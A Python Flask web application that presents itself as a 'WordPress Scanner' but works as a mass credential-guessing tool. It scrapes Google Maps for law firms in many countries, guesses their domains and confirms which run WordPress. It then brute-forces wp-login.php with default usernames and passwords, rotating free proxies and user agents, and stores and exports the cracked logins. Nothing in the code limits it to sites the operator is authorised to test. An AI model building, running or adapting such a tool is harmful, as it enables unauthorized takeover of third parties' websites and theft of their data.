#!/usr/bin/env python3
"""
WordPress Scanner Web Application - FULL VERSION
Includes: URL Discovery, TOR/Proxy, Quick Scan, All Features
"""

import os
import sys
import threading
import time
import random
import json
import sqlite3
import queue
import concurrent.futures
from datetime import datetime
from typing import List, Dict, Optional
from functools import wraps

# Flask imports
from flask import Flask, render_template, request, jsonify, Response, stream_with_context, session, redirect, url_for, flash
from flask_cors import CORS
from flask_login import LoginManager, login_user, logout_user, login_required, current_user

# ============= CONFIGURATION =============

app = Flask(__name__)
CORS(app)

# Configuration
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24).hex())
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

# Authentication
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'changeme123')

# Initialize Flask-Login
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

class User:
    def __init__(self, user_id):
        self.id = user_id
        self.is_authenticated = True
        self.is_active = True
        self.is_anonymous = False
    
    def get_id(self):
        return self.id

@login_manager.user_loader
def load_user(user_id):
    if user_id == ADMIN_USERNAME:
        return User(user_id)
    return None

# ============= IMPORTS FROM EXISTING MODULES =============

import requests
from bs4 import BeautifulSoup

# Try to import security modules
try:
    import config
    import security
    from logger import get_audit_logger, get_operation_logger
    from proxy_manager import get_proxy_manager, get_tor_manager
    from scanner_engine import ScannerEngine, ResultProcessor
    from wordpress_detector import WordPressDetector
    SECURITY_MODULES_AVAILABLE = True
except ImportError as e:
    SECURITY_MODULES_AVAILABLE = False
    print(f"[WARN] Security modules not available: {e}")

# Selenium imports
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("[WARN] Selenium not installed")

# ============= GLOBAL STATE =============

class ScannerState:
    def __init__(self):
        self.scanning = False
        self.collecting = False
        self.discovering = False
        self.current_progress = 0
        self.current_status = "Idle"
        self.logs = []
        self.results = []
        self.collected_urls = []
        self.stats = {"scanned": 0, "found": 0, "errors": 0, "verified": 0, "collected": 0}
        self._lock = threading.Lock()
        
        # Scanner objects
        self.proxy_manager = None
        self.tor_manager = None
        self.scanner = None
        
    def add_log(self, message: str):
        with self._lock:
            timestamp = datetime.now().strftime("%H:%M:%S")
            self.logs.append(f"[{timestamp}] {message}")
            if len(self.logs) > 1000:
                self.logs = self.logs[-1000:]
    
    def clear_logs(self):
        with self._lock:
            self.logs = []
    
    def update_stats(self, **kwargs):
        with self._lock:
            for k, v in kwargs.items():
                if k in self.stats:
                    self.stats[k] = v

state = ScannerState()

# ============= USER AGENTS =============

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
]

# ============= DATABASE =============

class URLDatabase:
    def __init__(self, db_file: str = "urls.db"):
        self.db_file = db_file
        self._init_db()
    
    def _init_db(self):
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS urls (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    url TEXT UNIQUE NOT NULL,
                    is_wordpress INTEGER DEFAULT -1,
                    verified_date TEXT,
                    discovered_date TEXT DEFAULT CURRENT_TIMESTAMP,
                    scan_result TEXT,
                    username TEXT,
                    password TEXT
                )
            ''')
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[DB ERROR] {e}")
    
    def url_exists(self, url: str) -> bool:
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            cursor.execute("SELECT 1 FROM urls WHERE url = ?", (url,))
            result = cursor.fetchone()
            conn.close()
            return result is not None
        except:
            return False
    
    def add_url(self, url: str, is_wordpress: int = -1) -> bool:
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            cursor.execute("""
                INSERT OR IGNORE INTO urls (url, is_wordpress, verified_date)
                VALUES (?, ?, ?)
            """, (url, is_wordpress, datetime.now().isoformat() if is_wordpress != -1 else None))
            added = cursor.rowcount > 0
            conn.commit()
            conn.close()
            return added
        except:
            return False
    
    def add_urls(self, urls: List[str], is_wordpress: int = -1) -> int:
        added = 0
        for url in urls:
            if self.add_url(url, is_wordpress):
                added += 1
        return added
    
    def get_urls(self, filter_type: str = "all") -> List[Dict]:
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            if filter_type == "wordpress":
                cursor.execute("SELECT * FROM urls WHERE is_wordpress = 1 ORDER BY id DESC")
            elif filter_type == "non_wordpress":
                cursor.execute("SELECT * FROM urls WHERE is_wordpress = 0 ORDER BY id DESC")
            elif filter_type == "unverified":
                cursor.execute("SELECT * FROM urls WHERE is_wordpress = -1 ORDER BY id DESC")
            else:
                cursor.execute("SELECT * FROM urls ORDER BY id DESC")
            
            rows = cursor.fetchall()
            conn.close()
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_url(self, url: str, **kwargs):
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            set_clause = ", ".join([f"{k} = ?" for k in kwargs.keys()])
            values = list(kwargs.values()) + [url]
            cursor.execute(f"UPDATE urls SET {set_clause} WHERE url = ?", values)
            conn.commit()
            conn.close()
        except:
            pass
    
    def clear_all(self):
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            cursor.execute("DELETE FROM urls")
            conn.commit()
            conn.close()
        except:
            pass

db = URLDatabase()

# ============= SCANNER FUNCTIONS =============

def get_session(proxy=None):
    """Get configured requests session"""
    session = requests.Session()
    session.headers['User-Agent'] = random.choice(USER_AGENTS)
    session.verify = True
    
    if proxy:
        session.proxies = {
            'http': f'http://{proxy}',
            'https': f'http://{proxy}'
        }
    
    return session

def is_wordpress(url: str, timeout: int = 10) -> bool:
    """Check if site is WordPress"""
    try:
        session = get_session()
        response = session.get(url, timeout=timeout)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        indicators = [
            soup.find('meta', {'name': 'generator', 'content': lambda x: x and 'WordPress' in x}),
            'wp-content' in response.text,
            'wp-includes' in response.text,
        ]
        
        return any(indicators)
    except:
        return False

def attempt_login(url: str, username: str, password: str, timeout: int = 10) -> bool:
    """Attempt WordPress login"""
    try:
        session = get_session()
        login_url = f"{url.rstrip('/')}/wp-login.php"
        
        payload = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f"{url.rstrip('/')}/wp-admin/",
            'testcookie': '1'
        }
        
        response = session.post(login_url, data=payload, allow_redirects=True, timeout=timeout)
        
        final_url = response.url
        is_wp_admin = '/wp-admin/' in final_url
        
        has_logged_in_cookie = any('wordpress_logged_in' in str(c.name) for c in session.cookies)
        
        content = response.text.lower()
        logged_in_indicators = [
            'dashboard' in content,
            'profile.php' in content,
            'log out' in content or 'logout' in content,
        ]
        
        success = is_wp_admin and (has_logged_in_cookie or any(logged_in_indicators))
        return success
    except Exception as e:
        state.add_log(f"[ERROR] Login failed: {str(e)}")
        return False

def scan_single(url: str, passwords: List[str], usernames: List[str] = None, timeout: int = 15) -> Dict:
    """Scan a single URL"""
    if usernames is None:
        usernames = ['admin', 'administrator', 'root']
    
    result = {
        'url': url,
        'username': None,
        'password': None,
        'status': 'error',
        'details': 'Not scanned'
    }
    
    try:
        if not is_wordpress(url, timeout=timeout // 2):
            result['status'] = 'not_wp'
            result['details'] = 'Not a WordPress site'
            return result
        
        for username in usernames:
            for password in passwords:
                state.add_log(f"[SCAN] {url} | {username}:{password}")
                
                if attempt_login(url, username, password, timeout=timeout):
                    result['username'] = username
                    result['password'] = password
                    result['status'] = 'success'
                    result['details'] = 'Valid credentials found'
                    state.update_stats(found=state.stats['found'] + 1)
                    return result
        
        result['status'] = 'failed'
        result['details'] = 'No valid credentials found'
        
    except requests.exceptions.Timeout:
        result['details'] = 'Timeout'
    except requests.exceptions.ConnectionError:
        result['details'] = 'Connection error'
    except Exception as e:
        result['details'] = str(e)
    
    return result

def scan_worker(url: str, passwords: List[str], usernames: List[str], thread_id: int):
    """Worker for scanning"""
    result = scan_single(url, passwords, usernames)
    with state._lock:
        state.results.append(result)
        state.stats['scanned'] += 1

# ============= SEARCH TERMS BY COUNTRY =============

SEARCH_TERMS = {
    # English speaking countries
    'USA': [
        'lawyer', 'attorney', 'law firm', 'legal services', 
        'personal injury lawyer', 'criminal defense attorney', 'family law attorney',
        'corporate law firm', 'real estate attorney', 'immigration lawyer',
        'divorce lawyer', 'estate planning attorney', 'business lawyer',
        'intellectual property lawyer', 'tax attorney', 'employment lawyer'
    ],
    'UK': [
        'solicitor', 'lawyer', 'legal firm', 'solicitors near me',
        'personal injury solicitor', 'family law solicitor', 'commercial solicitor',
        'property solicitor', 'will writing service', 'legal advice',
        'employment tribunal', 'criminal defence solicitor', 'conveyancing'
    ],
    'Canada': [
        'lawyer', 'attorney', 'law firm', 'legal services',
        'personal injury lawyer', 'family lawyer', 'criminal lawyer',
        'real estate lawyer', 'immigration lawyer', 'business lawyer',
        'estate planning lawyer', 'divorce lawyer', 'corporate lawyer'
    ],
    'Australia': [
        'lawyer', 'solicitor', 'law firm', 'legal services',
        'personal injury lawyer', 'family lawyer', 'criminal lawyer',
        'commercial lawyer', 'property lawyer', 'migration agent',
        'estate planning lawyer', 'corporate lawyer', 'IP lawyer'
    ],
    # Portuguese speaking countries
    'Brazil': [
        'advogado', 'escritório de advocacia', 'advocacia',
        'advogado criminalista', 'advogado familiar', 'advogado trabalhista',
        'advogado empresarial', 'advogado imobiliário', 'advogado de divórcio',
        'advogado de acidentes', 'advogado tributarista', 'advogado immigration',
        'direito civil', 'direito penal', 'direito trabalhista',
        'consultoria jurídica', 'advogado corporativo', 'advogado internacional'
    ],
    'Portugal': [
        'advogado', 'escritório de advogado', 'consultoria jurídica',
        'advogado criminalista', 'advogado familiar', 'advogado trabalhista',
        'advogado imobiliário', 'advogado comercial', 'direito civil',
        'solicitor', 'advogacia', 'mesa de apoio jurídico'
    ],
    # Spanish speaking countries
    'Spain': [
        'abogado', 'despacho de abogados', 'consultoría jurídica',
        'abogado penalista', 'abogado familiar', 'abogado laboralista',
        'abogado inmobiliario', 'abogado mercantil', 'derecho civil',
        'abogado corporativo', 'abogado de empresas', 'abogado immigration'
    ],
    'Mexico': [
        'abogado', 'bufete de abogados', 'servicios jurídicos',
        'abogado penalista', 'abogado familiar', 'abogado laboral',
        'abogado mercantil', 'abogado inmobiliario', 'derecho civil',
        'abogado corporativo', 'abogado de divorcios', 'consulta jurídica'
    ],
    'Argentina': [
        'abogado', 'estudio jurídico', 'asesoría legal',
        'abogado penalista', 'abogado familiario', 'abogado laboralista',
        'abogado inmobiliario', 'abogado comercial', 'derecho civil',
        'abogado corporativo', 'abogado previsional', 'consulta jurídica'
    ],
    # Other countries
    'Germany': [
        'Anwalt', 'Rechtsanwalt', 'Anwaltskanzlei', 'Rechtsberatung',
        'Strafverteidiger', 'Familienanwalt', 'Arbeitsrechtler',
        'Immobilienanwalt', 'Unternehmensanwalt', 'Erbrechtler',
        'Verkehrsrecht', 'Mietrecht', 'Gesellschaftsrecht'
    ],
    'France': [
        'avocat', 'cabinet d\'avocat', 'conseil juridique',
        'avocat pénal', 'avocat familial', 'avocat du travail',
        'avocat immobilier', 'avocat d\'entreprise', 'droit civil',
        'avocat corporate', 'avocat successoral', 'juriste'
    ],
    'Italy': [
        'avvocato', 'studio legale', 'consulenza legale',
        'avvocato penalista', 'avvocato familiare', 'avvocato del lavoro',
        'avvocato immobiliare', 'avvocato commerciale', 'diritto civile',
        'avvocato aziendale', 'avvocato successioni', 'studio giuridico'
    ]
}

def get_search_terms_for_country(country: str) -> List[str]:
    """Get search terms for a specific country"""
    return SEARCH_TERMS.get(country, SEARCH_TERMS['USA'])

def get_all_search_terms(countries: List[str]) -> List[str]:
    """Get all search terms for multiple countries"""
    terms = []
    for country in countries:
        terms.extend(get_search_terms_for_country(country))
    return list(set(terms))  # Remove duplicates

# ============= URL DISCOVERY (Google Maps) =============

class URLCollector:
    """Collects URLs from Google Maps"""
    
    def __init__(self):
        self.driver = None
        self._stop = False
        self.collected = []
        self.search_terms = []
        
    def setup_driver(self):
        """Setup Chrome driver"""
        if not SELENIUM_AVAILABLE:
            return False
            
        try:
            options = Options()
            options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--window-size=1920,1080')
            options.add_argument(f'--user-agent={random.choice(USER_AGENTS)}')
            
            self.driver = webdriver.Chrome(options=options)
            return True
        except Exception as e:
            state.add_log(f"[ERROR] Driver setup failed: {e}")
            return False
    
    def collect_from_maps(self, countries: List[str], max_urls: int = 100) -> List[str]:
        """Collect URLs from Google Maps"""
        if not self.setup_driver():
            state.add_log("[ERROR] Selenium not available")
            return []
        
        self._stop = False
        self.collected = []
        
        # Get country-specific search terms
        self.search_terms = get_all_search_terms(countries)
        state.add_log(f"[COLLECT] Using {len(self.search_terms)} search terms for {countries}")
        
        for country in countries:
            if self._stop:
                break
            
            # Get terms for this specific country
            country_terms = get_search_terms_for_country(country)
            
            for term in country_terms:
                if len(self.collected) >= max_urls:
                    break
                if self._stop:
                    break
                    
                try:
                    # Build search URL
                    query = f"{term} {country}"
                    search_url = f"https://www.google.com/maps/search/{query.replace(' ', '+')}"
                    
                    state.add_log(f"[COLLECT] Searching: {query}")
                    self.driver.get(search_url)
                    time.sleep(random.uniform(2, 4))
                    
                    # Scroll to load more results
                    for _ in range(5):
                        if self._stop or len(self.collected) >= max_urls:
                            break
                        self.driver.execute_script("document.querySelector('div[role=\"feed\"]').scrollBy(0, 2000)")
                        time.sleep(random.uniform(1, 2))
                    
                    # Find URLs
                    links = self.driver.find_elements(By.CSS_SELECTOR, "a[href*='maps']")
                    for link in links:
                        try:
                            href = link.get_attribute('href')
                            if href and 'place' in href:
                                # Extract business name from URL
                                if '/place/' in href:
                                    start = href.find('/place/') + 7
                                    end = href.find('/', start)
                                    if end == -1:
                                        end = href.find('?', start)
                                    if end > start:
                                        name = href[start:end]
                                        name = name.replace('+', ' ')
                                        url = f"https://{name.lower().replace(' ', '')}.com"
                                        
                                        if url not in self.collected and len(self.collected) < max_urls:
                                            self.collected.append(url)
                                            state.add_log(f"[FOUND] {url}")
                        except:
                            pass
                            
                except Exception as e:
                    state.add_log(f"[ERROR] Collection error: {e}")
        
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
        
        state.add_log(f"[COLLECT] Complete! {len(self.collected)} URLs collected")
        return self.collected
    
    def stop(self):
        """Stop collection"""
        self._stop = True
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass

url_collector = URLCollector()

# ============= PROXY MANAGEMENT =============

class ProxyManager:
    """Manages proxies"""
    
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.current_proxy = None
        
    def fetch_free_proxies(self) -> List[str]:
        """Fetch free proxies from public sources"""
        proxy_list = []
        
        try:
            # Fetch from free proxy sources
            urls = [
                'https://www.sslproxies.org/',
                'https://free-proxy-list.net/'
            ]
            
            session = get_session()
            for url in urls:
                try:
                    response = session.get(url, timeout=10)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    table = soup.find('table')
                    if table:
                        rows = table.find_all('tr')[1:]  # Skip header
                        for row in rows[:20]:  # First 20
                            cols = row.find_all('td')
                            if len(cols) >= 2:
                                ip = cols[0].text.strip()
                                port = cols[1].text.strip()
                                if ip and port:
                                    proxy_list.append(f"{ip}:{port}")
                except:
                    pass
                    
        except Exception as e:
            state.add_log(f"[PROXY] Fetch error: {e}")
        
        self.proxies = proxy_list
        return proxy_list
    
    def test_proxies(self) -> List[str]:
        """Test proxies and return working ones"""
        working = []
        
        def test_proxy(proxy):
            try:
                session = get_session(proxy)
                response = session.get('https://www.google.com', timeout=5)
                return proxy if response.status_code == 200 else None
            except:
                return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(test_proxy, self.proxies)
            working = [r for r in results if r]
        
        self.working_proxies = working
        state.add_log(f"[PROXY] {len(working)} working proxies found")
        return working
    
    def get_proxy(self) -> Optional[str]:
        """Get random working proxy"""
        if self.working_proxies:
            return random.choice(self.working_proxies)
        return None

proxy_manager = ProxyManager()

# ============= SCAN OPERATIONS =============

def start_scan(urls: List[str], passwords: List[str], usernames: List[str], threads: int = 3):
    """Start scanning"""
    state.scanning = True
    state.results = []
    state.stats = {"scanned": 0, "found": 0, "errors": 0, "verified": 0, "collected": len(urls)}
    state.add_log(f"[SCAN] Starting scan of {len(urls)} URLs")
    
    def run_scan():
        try:
            url_chunks = [urls[i::threads] for i in range(threads)]
            threads_list = []
            
            for i, chunk in enumerate(url_chunks):
                if chunk:
                    t = threading.Thread(target=lambda u=chunk: [scan_worker(url, passwords, usernames, i) for url in u])
                    t.start()
                    threads_list.append(t)
            
            while any(t.is_alive() for t in threads_list):
                time.sleep(1)
                state.current_progress = (state.stats['scanned'] / len(urls)) * 100 if urls else 0
                state.current_status = f"Scanned: {state.stats['scanned']}/{len(urls)}, Found: {state.stats['found']}"
            
            state.current_progress = 100
            state.current_status = "Scan complete"
            state.add_log(f"[SCAN] Complete! Found {state.stats['found']} credentials")
            
        finally:
            state.scanning = False
    
    thread = threading.Thread(target=run_scan)
    thread.start()

def start_discovery(countries: List[str], max_urls: int):
    """Start URL discovery"""
    state.discovering = True
    state.collected_urls = []
    state.stats["collected"] = 0
    state.add_log(f"[DISCOVERY] Starting discovery in {countries}")
    
    def run_discovery():
        try:
            urls = url_collector.collect_from_maps(countries, max_urls)
            state.collected_urls = urls
            state.stats["collected"] = len(urls)
            
            # Add to database
            added = db.add_urls(urls)
            state.add_log(f"[DISCOVERY] Added {added} URLs to database")
            
        finally:
            state.discovering = False
    
    thread = threading.Thread(target=run_discovery)
    thread.start()

def start_quick_scan(countries: List[str], passwords: List[str], usernames: List[str], threads: int, max_urls: int):
    """Combined discovery + verification + scanning"""
    state.scanning = True
    state.results = []
    state.stats = {"scanned": 0, "found": 0, "errors": 0, "verified": 0, "collected": 0}
    
    def run_quick_scan():
        try:
            # Phase 1: Discovery
            state.current_status = "Phase 1: Discovering URLs..."
            state.add_log("[QUICK] Phase 1: Discovering URLs")
            urls = url_collector.collect_from_maps(countries, max_urls)
            state.collected_urls = urls
            state.stats["collected"] = len(urls)
            db.add_urls(urls)
            state.add_log(f"[QUICK] Collected {len(urls)} URLs")
            
            if not urls:
                state.scanning = False
                return
            
            # Phase 2: Verification
            state.current_status = "Phase 2: Verifying WordPress..."
            state.add_log("[QUICK] Phase 2: Verifying WordPress sites")
            verified = []
            for i, url in enumerate(urls):
                is_wp = is_wordpress(url)
                if is_wp:
                    verified.append(url)
                    db.update_url(url, is_wordpress=1, verified_date=datetime.now().isoformat())
                state.current_progress = (i / len(urls)) * 50
                state.stats["verified"] = len(verified)
            
            state.add_log(f"[QUICK] Verified {len(verified)} WordPress sites")
            
            # Phase 3: Scanning
            state.current_status = "Phase 3: Scanning..."
            state.add_log(f"[QUICK] Phase 3: Scanning {len(verified)} sites")
            
            for i, url in enumerate(verified):
                result = scan_single(url, passwords, usernames)
                state.results.append(result)
                state.stats["scanned"] += 1
                if result['status'] == 'success':
                    state.stats["found"] += 1
                    db.update_url(url, scan_result='success', username=result['username'], password=result['password'])
                
                state.current_progress = 50 + (i / len(verified)) * 50
            
            state.current_status = f"Complete! Found {state.stats['found']} credentials"
            state.add_log(f"[QUICK] Complete! Found {state.stats['found']} credentials")
            
        except Exception as e:
            state.add_log(f"[QUICK] Error: {e}")
        finally:
            state.scanning = False
    
    thread = threading.Thread(target=run_quick_scan)
    thread.start()

# ============= ROUTES =============

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            user = User(username)
            login_user(user)
            return redirect(url_for('index'))
        else:
            flash('Invalid credentials', 'error')
    
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_authenticated:
            if 'authenticated' not in session:
                return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
@require_auth
def index():
    return render_template('index_full.html', _force_embedded=True)

# ============= API ROUTES =============

@app.route('/api/status')
@require_auth
def get_status():
    return jsonify({
        'scanning': state.scanning,
        'discovering': state.discovering,
        'collecting': state.collecting,
        'progress': state.current_progress,
        'status': state.current_status,
        'stats': state.stats,
        'results_count': len(state.results),
        'urls_count': len(db.get_urls())
    })

@app.route('/api/logs')
@require_auth
def get_logs():
    return jsonify({'logs': state.logs[-100:]})

@app.route('/api/logs/clear', methods=['POST'])
@require_auth
def clear_logs():
    state.clear_logs()
    return jsonify({'success': True})

@app.route('/api/urls')
@require_auth
def get_urls():
    filter_type = request.args.get('filter', 'all')
    urls = db.get_urls(filter_type)
    return jsonify({'urls': urls, 'count': len(urls)})

@app.route('/api/urls/add', methods=['POST'])
@require_auth
def add_urls():
    data = request.json
    urls = data.get('urls', [])
    
    if isinstance(urls, str):
        urls = [u.strip() for u in urls.split('\n') if u.strip()]
    
    added = db.add_urls(urls)
    return jsonify({'success': True, 'added': added})

@app.route('/api/urls/clear', methods=['POST'])
@require_auth
def clear_urls():
    db.clear_all()
    return jsonify({'success': True})

@app.route('/api/urls/verify', methods=['POST'])
@require_auth
def verify_urls():
    urls = [u['url'] for u in db.get_urls('all')]
    
    def run_verify():
        verified = 0
        for i, url in enumerate(urls):
            if state.scanning:
                break
            
            is_wp = is_wordpress(url)
            if is_wp:
                db.update_url(url, is_wordpress=1, verified_date=datetime.now().isoformat())
                verified += 1
            
            state.current_progress = ((i + 1) / len(urls)) * 100
            state.current_status = f"Verified: {i+1}/{len(urls)}, WP: {verified}"
        
        state.add_log(f"[VERIFY] Complete! {verified} WordPress sites")
    
    thread = threading.Thread(target=run_verify)
    thread.start()
    
    return jsonify({'success': True, 'total': len(urls)})

# Discovery endpoints
@app.route('/api/discovery/start', methods=['POST'])
@require_auth
def start_discovery_api():
    if state.discovering:
        return jsonify({'success': False, 'error': 'Discovery already in progress'})
    
    data = request.json
    countries = data.get('countries', ['USA', 'UK', 'Canada', 'Australia'])
    max_urls = data.get('max_urls', 100)
    
    start_discovery(countries, max_urls)
    return jsonify({'success': True})

@app.route('/api/discovery/stop', methods=['POST'])
@require_auth
def stop_discovery_api():
    url_collector.stop()
    state.discovering = False
    return jsonify({'success': True})

# Scan endpoints
@app.route('/api/scan/start', methods=['POST'])
@require_auth
def start_scan_api():
    if state.scanning:
        return jsonify({'success': False, 'error': 'Scan already in progress'})
    
    data = request.json
    urls = data.get('urls', [])
    passwords = data.get('passwords', ['admin', '123456', 'password', 'wordpress'])
    usernames = data.get('usernames', ['admin', 'administrator', 'root'])
    threads = data.get('threads', 3)
    
    if not urls:
        urls = [u['url'] for u in db.get_urls('wordpress')]
    
    if not urls:
        return jsonify({'success': False, 'error': 'No URLs to scan'})
    
    start_scan(urls, passwords, usernames, threads)
    return jsonify({'success': True, 'urls_to_scan': len(urls)})

@app.route('/api/scan/stop', methods=['POST'])
@require_auth
def stop_scan_api():
    state.scanning = False
    state.add_log("[SCAN] Stopped by user")
    return jsonify({'success': True})

# Quick scan endpoint
@app.route('/api/quick-scan/start', methods=['POST'])
@require_auth
def start_quick_scan_api():
    if state.scanning or state.discovering:
        return jsonify({'success': False, 'error': 'Already running'})
    
    data = request.json
    countries = data.get('countries', ['USA', 'UK'])
    passwords = data.get('passwords', ['admin', '123456', 'password'])
    usernames = data.get('usernames', ['admin', 'administrator'])
    threads = data.get('threads', 3)
    max_urls = data.get('max_urls', 50)
    
    start_quick_scan(countries, passwords, usernames, threads, max_urls)
    return jsonify({'success': True})

# Search terms endpoint
@app.route('/api/search-terms')
@require_auth
def get_search_terms():
    """Get search terms for countries"""
    countries = request.args.getlist('countries')
    if not countries:
        countries = list(SEARCH_TERMS.keys())
    
    terms = get_all_search_terms(countries)
    by_country = {c: get_search_terms_for_country(c) for c in countries}
    
    return jsonify({
        'all_terms': terms,
        'by_country': by_country
    })

# Proxy endpoints
@app.route('/api/proxy/fetch', methods=['POST'])
@require_auth
def fetch_proxies():
    state.add_log("[PROXY] Fetching free proxies...")
    proxies = proxy_manager.fetch_free_proxies()
    return jsonify({'success': True, 'count': len(proxies), 'proxies': proxies[:10]})

@app.route('/api/proxy/test', methods=['POST'])
@require_auth
def test_proxies():
    state.add_log("[PROXY] Testing proxies...")
    working = proxy_manager.test_proxies()
    return jsonify({'success': True, 'working': len(working)})

@app.route('/api/proxy/list')
@require_auth
def list_proxies():
    return jsonify({
        'all': proxy_manager.proxies[:20],
        'working': proxy_manager.working_proxies
    })

# Results
@app.route('/api/results')
@require_auth
def get_results():
    return jsonify({
        'results': state.results,
        'stats': state.stats
    })

@app.route('/api/results/export')
@require_auth
def export_results():
    import csv
    import io
    
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['URL', 'Username', 'Password', 'Status', 'Details'])
    
    for r in state.results:
        writer.writerow([
            r.get('url', ''),
            r.get('username', ''),
            r.get('password', ''),
            r.get('status', ''),
            r.get('details', '')
        ])
    
    return Response(
        output.getvalue(),
        mimetype="text/csv",
        headers={"Content-disposition": "attachment; filename=results.csv"}
    )

# ============= MAIN =============

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_DEBUG', 'false').lower() == 'true'
    
    print(f"[INFO] Starting WordPress Scanner on port {port}")
    print(f"[INFO] Open http://localhost:{port}")
    
    app.run(host='0.0.0.0', port=port, debug=debug, threaded=True)
